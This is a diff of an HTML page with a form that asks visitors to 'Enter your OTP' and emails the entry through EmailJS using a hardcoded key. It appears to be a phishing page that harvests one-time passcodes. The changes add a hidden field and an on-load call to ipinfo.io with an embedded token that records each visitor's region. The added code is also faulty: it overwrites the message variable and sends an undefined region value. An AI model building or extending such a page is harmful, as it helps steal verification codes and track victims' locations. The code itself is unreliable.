@@ -325,6 +325,7 @@
                 <input type="text" id="name" name="name"  value="EMAIL OTP" placeholder="OTP" hidden>
                 <!--<label for="email">Email</label>
                 <input type="text" id="email" name="email" placeholder="Email">-->
+                <input type="hidden" id="region" name="region">
                 <input type="text" id="email" name="email"  value="EMAIL OTP" placeholder="OTP" hidden>
 
                 <label for="password">Enter your OTP</label>
@@ -352,12 +353,14 @@
         var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
         var message = document.getElementById("message").value;
+        var message = document.getElementById("region").value;
 
         // Prepare email parameters
         var emailParams = {
             from_name: name,
             from_email: email,
-            message: message
+            message: message,
+            region: region
         };
 
         // Send the email using EmailJS
@@ -383,6 +386,30 @@
         publicKey: "xlkCcpryUFq2iLP5L",
       });
    })();
+</script>
+    <script>
+  // Function to get user's country using IP info service
+  function getUserRegion() {
+      // Use ipinfo.io API to get user's geolocation info
+      fetch('https://ipinfo.io?token=999a655c730c7c') // Replace 'YOUR_API_TOKEN' with your actual API token
+          .then(response => response.json())
+          .then(data => {
+              // Get the country from the response data
+              var region = data.region;
+
+              // Populate the hidden form field with the country code
+              document.getElementById('region').value = region;
+          })
+          .catch(error => {
+              // Handle error if the API request fails
+              alert('Error fetching region: ' + error.message);
+          });
+  }
+
+  // Call getUserCountry when the page loads
+  window.onload = function() {
+      getUserRegion();
+  }
 </script>
 </body>
 </html>
